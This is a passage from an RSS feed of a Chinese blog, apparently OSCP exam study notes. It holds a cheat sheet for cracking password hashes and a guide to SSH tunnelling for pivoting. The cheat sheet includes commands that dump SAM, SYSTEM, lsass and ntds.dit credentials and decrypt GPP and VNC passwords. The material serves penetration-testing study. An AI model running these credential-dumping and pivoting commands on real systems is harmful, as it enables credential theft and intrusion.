&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;破解压缩包密码&#34;&gt;破解压缩包密码：&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;7z2john backup.7z &amp;gt; hash3 
john -wordlist=/usr/share/wordlists/rockyou.txt hash3

zip2john backup.zip &amp;gt; hashes 
john --wordlist=/usr/share/wordlists/rockyou.txt hashes

zip：

sudo hashcat -m 13600 hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
13600
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;swp&#34;&gt;.swp:&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;vi/vim -r 
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;破解hash&#34;&gt;破解hash&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;判断hash类型：
hashid 
hash-identifier

md5:
hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt

其他类型的hash查询：
https://hashcat.net/wiki/doku.php?id=example_hashes

无线密码：
aircrack-ng -w /usr/share/wordlists xx.cap


shadow密码：
john shadow --format=crypt --wordlist=/usr/share/xxx

hashcat:
https://blog.csdn.net/m0_43406494/article/details/116736263

修改shadow的文件，包括前面的名字，和后面的很多::的内容

hashcat -m 1800 shadow /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

查看爆破成功的密码：
hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --show
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;密码生成&#34;&gt;密码生成&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Crunch工具的使用方法：
https://blog.csdn.net/qq_63844103/article/details/127979575
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;ntlm-hash获取&#34;&gt;NTLM HASH获取&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;获取备份：
reg save HKLM\sam sam.bak
reg save HKLM\system system.bak

或者：
C:\WIndows\System32\config\SAM
C:\Windows\System32\config\SYSTEM

读取sam的hash:
samdump2 SYSTEM SAM

john破解nt hash
将上一步提取的hash保存为文件：
john --wordlist=/user/xxx hash.txt --format=nt
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;证书提取&#34;&gt;证书提取&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;提取私钥
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
提取公钥
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem

直接申请TGT：
gettgtpkinit.py

https://wadcoms.github.io/wadcoms/PKINIT-gettgtpkinit/

得提前配置kinit
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;gpp密码解密&#34;&gt;GPP密码解密&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;自动：
https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1


手动：
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;vnc解密&#34;&gt;VNC解密&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo -n 加密密码，去掉： | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;提取宏文件&#34;&gt;提取宏文件&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;提取文件：
unzip Currency\ Volume\ Report.xlsm
宏文件通常为.bin结尾的哪个，使用strings读取即可
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;dump内存读取&#34;&gt;dump内存读取&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;pip3 install pypykatz  
pypykatz lsa minidump lsass.DMP
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;ntdsdit密码获取&#34;&gt;ntds.dit密码获取&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;这个文件无法直接获取，正常情况下需要管理员权限，但是特殊情况下可以获取，比如BACKUP OPERATORS组用户：
参考：
https://gist.github.com/manesec/9e0e8000446b966d0f0ef74000829801

这个文件需要配合system.hive文件进行破解，获取方法：
reg save HKLM\SYSTEM C:\system.hive


破解：
python3 secretsdump.py -ntds ~/Desktop/ntds.dit -system ~/Desktop/system.hiv LOCAL
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;16进制转换成字符串&#34;&gt;16进制转换成字符串：&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo -n &amp;#39;6d2424716c5f53405f504073735730726421&amp;#39; | xxd -r -p
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;msg格式文件读取&#34;&gt;msg格式文件读取&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;转换格式为eml:
msgconvert *.msg
读取：
xdg-open xx.eml
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;hashcat&#34;&gt;hashcat&lt;/h1&gt;
&lt;p&gt;规则编写：&lt;/p&gt;</description>
    </item>
    <item>
      <title>隧道代理</title>
      <link>https://yangzhuzai.github.io/posts/oscp/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/</guid>
      <description>&lt;h1 id=&#34;linux&#34;&gt;Linux&lt;/h1&gt;
&lt;h2 id=&#34;ssh&#34;&gt;SSH&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;-g：开启网关，使同一个局域网内的设备都可以访问。不然只有kali的IP才能访问。 
-N：仅实现端口转发功能，不登录ssh。 
-L：表示local，本地端口转发； 

知道目标主机的ssh账密的情况：

本地端口转发，以下命令的意思为，将主机10.10.10.1的4321端口，映射为127.0.0.1的1234端口，也就是说，访问本地的1234端口，相当于访问10.10.10.1的4321端口 

ssh -g -N -L [1234]:[127.0.0.1]:[4321] [cxk]@[10.10.10.1] -p [22] 

远距离端口转发，（不包括攻击机）适合三台，第二台有ssh密码的情况
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215

远程端口转发，以下命令的意思为，将主机10.10.10.1的4321端口映射为192.168.2.1的1234端口，适用于中间主机的情况，回连kali

ssh -g -N -R [1234]:[192.168.2.1]:[4321] [cxk]@[10.10.10.1] -p [22] 

中间主机+远程端口+本地kali 远距离端口转发
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4


SOCKS代理，socks5 无账号密码，连接本地127.0.0.1即可 

ssh -g -N -D [127.0.0.1][1234] [ssh帐号]@[ssh服务IP] -p [ssh服务端口]

ssh -N -D 0.0.0.0:9999 database_admin@10.4.187.215




本机kali开放ssh，需要ssh版本7.6以上：
sudo systemctl restart ssh.service
ssh -N -R 9998 kali@192.168.5.66
socks隧道，kali的9998即代表远程主机的
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;ssh-本地端口转发&#34;&gt;SSH 本地端口转发：&lt;/h2&gt;
&lt;p&gt;DMZ第一台主机已经拿下，有第二台主机的ssh账密，一二之间通过ssh隧道通信，访问一的445可以访问到第三台的445端口&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/oscp_img/Pasted%20image%2020240314213959.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
